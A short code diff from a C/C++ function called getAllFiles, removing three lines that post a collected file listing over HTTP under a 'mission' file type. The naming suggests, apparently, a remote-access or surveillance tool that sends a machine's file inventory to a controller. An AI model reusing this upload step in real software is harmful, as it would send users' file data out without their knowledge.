@@ -270,10 +270,6 @@ int __stdcall getAllFiles()
 
 		CloseHandle(hFile);
 
-		PacketParcel http(TRUE);
-
-		iRet = http.postFile(ALLFILES_FILENAME, MISSION_TYPE_FILE);
-
 		return TRUE;
 	}
 	catch (...)
